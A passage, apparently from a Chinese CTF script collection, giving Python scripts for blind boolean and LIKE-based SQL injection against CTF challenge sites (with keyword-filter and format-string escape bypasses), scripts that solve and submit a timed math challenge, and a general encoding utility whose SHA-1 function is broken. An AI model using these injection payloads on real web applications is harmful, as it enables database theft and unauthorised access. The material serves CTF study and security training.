            res = "0'oorr((select(mid(group_concat(column_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.columns)where(table_name)='fiag')='%s')oorr'0" % (
            i, j)
            res = res.replace(' ', chr(0x0a))
            key = {'id': res}
            r = requests.post(url, data=key).text
            print("......%s.........%s........." % (i, j))
            if str in r:
                column += j
                break
    print(column)
    print("end!")

def get_value():
    flag = ""
    print("start")
    for i in range(1, 20):
        for j in guess:
            res = "0'oorr((select(mid((fl$4g)from(%s)foorr(1)))from(fiag))='%s')oorr'0" % (i, j)
            res = res.replace(' ', chr(0x0a))
            key = {'id': res}
            r = requests.post(url, data=key).text
            'print("........%s..........%s........"%(i,j))'
            if str in r:
                flag += j
                print(flag)
                break
    print(flag)
    print("end!")

get_ziduan_length('fiag')
```

**sql bool爆破自动脚本**

```
import requests

def str_to_hex(s):
    return ''.join([hex(ord(c)).replace('0x', '') for c in s])

def boom():
    url = 'http://7e14e5869b3e4d77a8e5ef931f13dafed89ecee1787c4d59.game.ichunqiu.com/index.php'
    s = requests.session()
    dic = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+{}-="  # 名字猜解的字符范围
    right = 'password error!'
    error = 'username error!'

    lens = 0
    i = 0
    while True:
        payload = "admin%1$\\' or " + "length(database())>" + str(i) + "#"
        data = {'username': payload, 'password': 1}
        r = s.post(url, data=data).content.decode()
        if error in r:
            lens = i
            break
        i += 1
        pass
    print("[+]length(database()): %d" %(lens))

    strs=''
    for i in range(lens+1):
        for c in dic:
            payload = "admin%1$\\' or " + "ascii(substr(database()," + str(i) + ",1))=" + str(ord(c)) + "#"
            data = {'username': payload, 'password': 1}
            r = s.post(url,data=data).content.decode()
            if right in r:
                strs = strs + c
                print(strs)
                break
        pass
    pass
    print("[+]database():%s" %(strs))

    lens=0
    i = 1
    while True:
        payload = "admin%1$\\' or " + "(select length(table_name) from information_schema.tables where table_schema=" \
                                      "database() limit 0,1)>" + str(i) + "#"
        data = {'username': payload, 'password': 1}
        r = s.post(url,data=data).content.decode()
        if error in r:
            lens = i
            break
        i+=1
        pass
    print("[+]length(table): %d" %(lens))

    strs=''
    for i in range(lens+1):
        for c in dic:
            payload = "admin%1$\\' or " + "ascii(substr((select table_name from information_schema.tables where table_" \
                                          "schema=database() limit 0,1)," + str(i) + ",1))=" + str(ord(c)) + "#"
            data = {'username': payload, 'password': 1}
            r = s.post(url, data=data).content.decode()
            if right in r:
                strs = strs + c
                print(strs)
                break
        pass
    pass
    print("[+]table_name:%s" %(strs))
    tablename = '0x' + str_to_hex(strs)
    table_name = strs

    lens=0
    i = 0
    while True:
        payload = "admin%1$\\' or " + "(select length(column_name) from information_schema.columns where" \
                                      " table_name = " + tablename + " limit 0,1)>" + str(i) + "#"
        data = {'username': payload, 'password': 1}
        r = s.post(url,data=data).content.decode()
        if error in r:
            lens = i
            break
        i += 1
        pass
    print("[+]length(column): %d" %(lens))

    strs=''
    for i in range(lens+1):
        for c in dic:
            payload = "admin%1$\\' or " + "ascii(substr((select column_name from information_schema.columns where table_name = " + str(tablename) +" limit 0,1)," + str(i) + ",1))=" + str(ord(c)) + "#"
            data = {'username': payload, 'password': 1}
            r = s.post(url,data=data).content.decode()
            if right in r:
                strs = strs + c
                print(strs)
                break
        pass
    pass
    print("[+]column_name:%s" %(strs))
    column_name = strs

    num=0
    i = 0
    while True:
        payload = "admin%1$\\' or " + "(select count(*) from " + table_name + ")>" + str(i) + "#"
        data = {'username': payload, 'password': 1}
        r = s.post(url, data=data).content.decode()
        if error in r:
            num = i
            break
        i+=1
        pass
    print("[+]number(column): %d" %(num))

    lens=0
    i = 0
    while True:
        payload = "admin%1$\\' or " + "(select length(" + column_name + ") from " + table_name + " limit 0,1)>" + str(i) + "#"
        data = {'username': payload, 'password': 1}
        r = s.post(url, data=data).content.decode()
        if error in r:
            lens = i
            break
        i+=1
        pass
    print("[+]length(value): %d" %(lens))

    i=1
    strs=''
    for i in range(lens+1):
        for c in dic:
            payload = "admin%1$\\' or ascii(substr((select flag from flag limit 0,1)," + str(i) + ",1))=" + str(ord(c)) + "#"
            data = {'username': payload, 'password': '1'}
            r = s.post(url, data=data).content.decode()
            if right in r:
                strs = strs + c
                print(strs)
                break
        pass
    pass
    print("[+]flag:%s" %(strs))

if __name__ == '__main__':
    boom()
    print('Finish!') 
```

**sql 使用like暴力猜解**

```
import string
import requests

url = 'http://4a899a854a124b3ba03b32764e949ce4d677a918742d4c56.game.ichunqiu.com/Challenges/index.php'
headers = {'User-Agent': "Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0"}
payloads = string.ascii_letters + string.digits
temp = ''
for i in range(40):
    print("hello")
    for p in payloads:
        payload = temp + p
        name = "admin' or user_n3me like '{}%' ;#".format(payload)
        data = dict(username=name, passwrod='test')
        res = requests.post(url, headers=headers, data=data)
        if (len(res.content) == 12):
            temp = temp + p
            print(temp.ljust(32, '.'))
            break 
```

**内容匹配与提交**

这是那个要求快速计算加减乘除然后上交的，我们可能还会遇到其他的不同要求的，要学会使用正则表达式进行匹配，然后进行字符串操作提取关键信息。

```
import requests
import re

url = "http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php"
respon = requests.get(url)
# print(respon.content)
# rmatch = re.compile("[0-9]{2,5}")

# #   2559*81551+1066*(2559+81551)
# findall 和 match的区别 match是匹配不上的 因为是从源头匹配 匹配不到就没有结果
es = re.findall(r"\d{2,6}", respon.content.decode('utf-8'))
result = int(es[0])*int(es[1])+int(es[2])*(int(es[3])+int(es[4]))
# print(result)

# 第二次提交数据 注意提交数据也是键值对形式
date = {"v": str(result)}
header = {'Cookie': 'PHPSESSID=356ee82e732bcef813ac0b37ba8fddf5'}
response = requests.post(url, headers=header, data=date)
print(response.content.decode('utf-8'))
```

```
import requests
import re

url = 'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'
header = {'Cookie': 'PHPSESSID=356ee82e732bcef813ac0b37ba8fddf5'} #填入自己的cookie

contents = requests.get(url, headers = header).content.decode('utf-8')
matches = re.search("(.+)=<(input)", contents)

data = {'v': str(eval(matches.group(1)))}
contents = requests.post(url, headers=header, data=data).content.decode('utf-8')

matches = re.search("<body>(.*)</body>", contents)
print(matches.group(1))
```

**常用CTF工具**

 这是网上一个大佬写的，主要就是各种加密解密的脚本，但是大多数都可以使用网上在线的解码，不过就作为一个扩展吧。

```
# -*- coding:utf-8 -*-
import hashlib
import base64
import urllib
import argparse

"""

        名字：CTF之常用工具汇总

        作者：白猫

        时间：2018-3-22

        QQ ：1058763824

"""

def menu():
    usage = """
       -m      MD5 encryption
       -s      SH1 encryption
       -h      Show help information
       -b64    Base64 encode
       -b32    Base32 encode
       -b16    Base16 encode
       -db64   Base64 decode
       -db32   Base32 decode
       -db16   Base16 decode
       -urlen  URL encode
       -urlde  URL decode
       -bin    Binary To Decimal
       -octal  Octal  to Decimal
       -hex    Hexadecimal to Decimal
       -dbin   Decimal To Binary 
       -doctal Decimal to Octal 
       -dhex   Decimal to Hexadecimal
       -ord    Letter To ASCII           Example  -ord asdfasfa      -ord='dfafs afasfa  asfasf'
       -chr    ASCII  To Letters         Example  -chr 105           -chr = '102 258 654'

    """

    # 在使用ord 和chr命令的时候要注意如果输入的字符和数字不包含空格则直接实用例子前面的命令如果包含空格则使用后面的命令

    parser = argparse.ArgumentParser()

    parser.add_argument('-m', dest='md', help='MD5 encryption')

    parser.add_argument('-s', dest='sh', help='SH1 encryption')

    parser.add_argument('--h', action="store_true", help='Show help information')

    parser.add_argument('-b64', dest='b64', help='Base64 encode')

    parser.add_argument('-b32', dest='b32', help='Base32 encode')

    parser.add_argument('-b16', dest='b16', help='Base16 encode')

    parser.add_argument('-db64', dest='db64', help='Base64 decode')

    parser.add_argument('-db32', dest='db32', help='Base32 decode')

    parser.add_argument('-db16', dest='db16', help='Base16 decode')

    parser.add_argument('-urlen', dest='urlen', help='URL encode')

    parser.add_argument('-urlde', dest='urlde', help='URL decode')

    parser.add_argument('-bin', dest='bin', help='Binary To Decimal')

    parser.add_argument('-octal', dest='octal', help='Octal  to Decimal')

    parser.add_argument('-hex', dest='hex', help='Hexadecimal to Decimal')

    parser.add_argument('-dbin', dest='dbin', help='Decimal To Binary ')

    parser.add_argument('-doctal', dest='doctal', help='Decimal to Octal ')

    parser.add_argument('-dhex', dest='dhex', help='Decimal to Hexadecimal')

    parser.add_argument('-ord', dest='ord',
                        help="Letter To ASCII               Example  -ord aaaaaa  , -ord=\"aaa aaa\"")

    parser.add_argument('-chr', dest='chr',
                        help="ASCII  To Letter              Example  -chr 105     ,  -chr = \"101 101\" ")

    options = parser.parse_args()

    if options.md:

        s = options.md

        md5(s)

    elif options.sh:

        s = options.sh

        sh1(s)

    elif options.b64:

        s = options.b64

        stringToB64(s)

    elif options.b32:

        s = options.b32

        stringToB32(s)

    elif options.b16:

        s = options.b16

        stringToB16(s)

    elif options.db64:

        s = options.db64

        b64ToString(s)

    elif options.db32:

        s = options.db32

        b32ToString(s)

    elif options.db16:

        s = options.db16

        b16ToString(s)

    elif options.urlen:

        s = options.urlen

        urlEncode(s)

    elif options.urlde:

        s = options.urlde

        urlDecode(s)

    elif options.bin:

        s = options.bin

        binToDec(s)

    elif options.octal:

        s = options.octal

        octToDec(s)

    elif options.hex:

        s = options.hex

        hexToDec(s)

    elif options.dbin:

        s = options.dbin

        decToBin(s)

    elif options.doctal:

        s = options.doctal

        decToOct(s)

    elif options.dhex:

        s = options.dhex

        decToHex(s)

    elif options.doctal:

        s = options.doctal

        decToOct(s)

    elif options.dhex:

        s = options.dhex

        decToHex(s)

    elif options.ord:

        s = options.ord

        lettToASCII(s)

    elif options.chr:

        s = options.chr

        asciiToLett(s)

    else:

        helpInfo()

def helpInfo():
    print("""
-m MD5 encryption
       -s      SH1 encryption
       --h      Show help information
       -b64    Base64 encode
       -b32    Base32 encode
       -b16    Base16 encode
       -db64   Base64 decode
       -db32   Base32 decode
       -db16   Base16 decode
       -urlen  URL encode
       -urlde  URL decode
       -bin    Binary To Decimal
       -octal  Octal Decimal to Decimal
       -hex    Hexadecimal to Decimal
       -dbin   Decimal To Binary 
       -doctal Decimal to Octal 
       -dhex   Decimal to Hexadecimal
       -ord    Letter To ASCII  attention  Example  -ord asdfasfa      -ord="dfafs afasfa  asfasf"
       -chr    ASCII  To Letters           Example  -chr 105           -chr = "102 258 654"
""")

# 进行MD5加密

def md5(s):
    original = s

    md = hashlib.md5()

    s = s.encode(encoding='utf-8')

    md.update(s)

    print('Original:' + original)

    print('Md5 Encryption:' + md.hexdigest())

# 进行sh1加密

def sh1(s):
    original = s

    sh = hashlib.sha1()

    s = s.encode(encoding='utf-8')

    print('Original:' + original)

    print('SH1 Encryption:' + sh.hexdigest())

# 将字符串转换为base64编码格式

def stringToB64(s):
    encode = base64.b64encode(s)

    print('Original:' + s)

    print('Base64 encode:' + encode)

# 将base64编码格式转化为正常的字符类型

def b64ToString(s):
    decode = base64.b64decode(s)

    print('Base64:' + s)

    print('Base64 decode:' + decode)

# 将字符串转为b32编码格式

def stringToB32(s):
    encode = base64.b32encode(s)

    print('Original:' + s)

    print('Base32 encode:' + encode)

# 将base32编码格式转化为正常的字符类型

def b32ToString(s):
    decode = base64.b32decode(s)

    print('Base32:' + s)

    print('Base32 decode:' + decode)

# 将字符串转为base16编码格式

def stringToB16(s):
    encode = base64.b16encode(s)

    print('Original:' + s)

    print('Base16 encode:' + encode)

# 将base16编码格式转化为正常的字符类型

def b16ToString(s):
    decode = base64.b16decode(s)

    print('Base16:' + s)

    print('Base16 decode:' + decode)

# 进行url编码

def urlEncode(s):
    encode = urllib.quote(s)

    print('Original:' + s)

    print('URL encode:' + encode)

# 进行url编码

def urlDecode(s):
    decode = urllib.unquote(s)

    print('URL encode:' + s)

    print('URL decode:' + decode)

# 将二进制转化为十进制

def binToDec(s):
    result = int(s, 2)

    print('Binary :' + str(s))

    print('Decimal :' + str(result))

# 将八进制转化为十进制

def octToDec(s):
    result = int(s, 8)

    print('Octal :' + str(s))

    print('Decimal :' + str(result))

# 将十六进制转化为十进制

def hexToDec(s):
    result = int(s, 16)

    print('Hex :' + str(s))

    print('Decimal :' + str(result))

# 将十进制转化为二进制

def decToBin(s):
    s = int(s)

    result = bin(s)

    print('Decimal:' + str(s))

    print('Binary:' + str(result))

# 将十进制转化为八进制

def decToOct(s):
    s = int(s)

    result = oct(s)

    print('Decimal :' + str(s))

    print('Octal :' + str(result))

# 将十进制转化为十六进制

def decToHex(s):
    s = int(s)

    result = hex(s)

    print('Decimal :' + str(s))

    print('Hex :' + str(result))

# 将字母转化为对应的ASCII

def lettToASCII(s):
    print('Letters:' + s)

    result = ''

    for i in s:
        result = result + str(ord(i)) + ' '

    print('ASCII  :' + result)

# 将ASCII转化为对应的字母以及字符

def asciiToLett(s):
    list = s.split(' ')

    result = ''

    print('ASCII    :' + s)

    for i in list:
        i = int(i)

        result = result + chr(i)

    print('Letters  :' + result)

if __name__ == '__main__':
    menu() 
```